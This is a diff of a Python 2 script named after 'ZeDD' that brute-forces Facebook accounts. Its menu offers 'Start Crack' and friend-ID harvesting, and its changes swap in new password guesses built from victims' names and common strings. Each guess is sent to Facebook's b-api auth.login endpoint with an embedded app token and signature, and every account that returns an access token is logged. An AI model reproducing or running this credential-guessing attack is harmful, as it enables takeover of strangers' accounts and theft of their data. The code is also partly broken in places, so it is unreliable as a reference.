@@ -1,6 +1,5 @@
-
 # -*- coding: utf-8 -*-
-# mau ngapain bro mau recode ea buat sendiri lah bgst
+# Em710
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
@@ -23,9 +22,8 @@ def jalan(z):
         sys.stdout.flush()
 
 logo = """\033[1;96m█████████\033[1;96m█▄█████▄█ \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─ ╔═╗╔╗ \033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m-- - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴ ╚ ╚═╝ \033[1;96mZeDD\033[1;96m█████████ \033[1;92m«----------✧----------»\033[1;96m ██ ██ \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
-\033[1;91m╔═════════════════════════════════════════════╗
+\033[1;91m╔═══════════════════════\033[1;95m══════════════════════╗
 \033[1;91m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;33m[ZɘDD] \033[1;91m
-\033[1;91m║\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m[https//:github.com/EmZee07] \033[1;91
 \033[1;94m║\033[1;93m* \033[1;97mSupport \033[1;91m: \033[1;98m[Rʌɱzʌŋ] \033[1;95m[Gɱ & Aɗŋʌŋ] \033[1;96m[Hʌsɘɘɓ] \033[1;95m
 \033[1;94m╚═══════════════════════\033[1;95m══════════════════════╝"""
 
@@ -67,9 +65,9 @@ def login():
     except (KeyError, IOError):
         os.system('clear')
         print 55 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91mLogin With Facebook ID'
+        print '\x1b[1;91mLogin With Facebook Use A New ID'
         print 55 * '\x1b[1;97m═'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLogin Fb With New ID \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLogin Fb With New ID\x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail|ID \x1b[1;91m:\x1b[1;92m ')
         pwd = raw_input('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
         tik()
@@ -150,15 +148,15 @@ def menu():
     print logo
     print '\x1b[1;93m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
     print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Name       \x1b[1;93m: \x1b[1;92m' + nama + (33 - len(nama)) * '\x1b[1;93m ' + '║'
-    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m ID FB ZeDD \x1b[1;93m: \x1b[1;92m' + id + (33 - len(id)) * '\x1b[1;93m ' + '║'
-    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Followers  \x1b[1;93m: \x1b[1;92m' + sub + (33 - len(sub)) * '\x1b[1;93m ' + '║'
+    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m ID FB ZeDD \x1b[1;93m: \x1b[1;92m' + id + (33 - len(id)) *     '\x1b[1;93m ' + '║'
+    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Followers  \x1b[1;93m: \x1b[1;92m' + sub + (33 - len(sub)) *   '\x1b[1;93m ' + '║'
     print '\x1b[1;93m╠' + 50* '\xe2\x95\x90' + '║'
-    print '║-» \x1b[1;36;49m1. Auto Crack                                  \x1b[1;93m║'
+    print '║-» \x1b[1;36;49m1. Start Crack                                 \x1b[1;93m║'
     print '║-» \x1b[1;36;49m2. Manual Crack                                \x1b[1;93m║'
     print '║-» \x1b[1;36;49m3. ID Group                                    \x1b[1;93m║'
-    print '║-» \x1b[1;36;49m4.  Getting ID/Email/Hp Friends                     \x1b[1;93m║'
-    print '║-» \x1b[1;36;49m5. Getting Accounts                                  \x1b[1;93m║'
-    print '║-» \x1b[1;36;49m0. Back                                      \x1b[1;93m║'
+    print '║-» \x1b[1;36;49m4. Getting ID/Email/Hp Friends                 \x1b[1;93m║'
+    print '║-» \x1b[1;36;49m5. Getting Accounts                            \x1b[1;93m║'
+    print '║-» \x1b[1;36;49m0. Back                                        \x1b[1;93m║'
     print '\x1b[1;93m╠' + 50* '\xe2\x95\x90' + '╝'
     pilih()
 
@@ -334,7 +332,7 @@ def pilih_super():
                                                         print '\x1b[1;93m[\x1b[1;93m❪✗❫\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass6 +'➛' + b['name']
                                                         print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                     else:
-                                                       pass7 = b['last_name'] + '12345'
+                                                       pass7 = b['last_name'] + '113'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
@@ -356,7 +354,7 @@ def pilih_super():
                                                                       print '\x1b[1;97m[\x1b[1;93m❪✗❫\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass8 +'➛' + b['name']
                                                                       print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                   else:
-                                                                     pass9 = 'Pakistan'
+                                                                     pass9 = b['last_name'] + '113'
                                                                      data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                      q = json.load(data)
                                                                      if 'access_token' in q:
@@ -367,7 +365,7 @@ def pilih_super():
                                                                              print '\x1b[1;97m[\x1b[1;93m❪✗❫\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass9 +'➛' + b['name']
                                                                              print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                          else:
-                                                                            pass10 = 'Love143'
+                                                                            pass10 = '786000'
                                                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                             q = json.load(data)
                                                                             if 'access_token' in q:
@@ -433,7 +431,7 @@ def pilih_super():
                                                                                                                     print '\x1b[1;97m[\x1b[1;93m❪✗❫\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass15 +'➛' + b['name'] 
                                                                                                                     print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                 else:
-                                                                                                                   pass16 = 'Love123'
+                                                                                                                   pass16 = 'Honey123'
                                                                                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                    q = json.load(data)
                                                                                                                    if 'access_token' in q:
@@ -455,7 +453,7 @@ def pilih_super():
                                                                                                                                   print '\x1b[1;97m[\x1b[1;93m❪✗❫\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass17 +'➛' + b['name'] 
                                                                                                                                   print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                               else:
-                                                                                                                                 pass18 = b['last_name'] + '11'
+                                                                                                                                 pass18 = b['last_name'] + '00'
                                                                                                                                  data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                                  q = json.load(data)
                                                                                                                                  if 'access_token' in q:
@@ -487,7 +485,7 @@ def pilih_super():
                                                                                                                                                             print '\x1b[1;97m[\x1b[1;93m❪✗❫\xe2\x9c\x9a\x1b[1;97m] ' + user +' | ' + pass20 +'➛' + b['name'] 
                                                                                                                                                             print 55 * '\x1b[1;97m\xe2\x95\x90'
                                                                                                                                                         else:
-                                                                                                                                                           pass21 = b['first_name']  '7172'
+                                                                                                                                                           pass21 = b['first_name'] + '7172'
                                                                                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass21 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                                                                                                            q = json.load(data)
                                                                                                                                                            if 'access_token' in q:
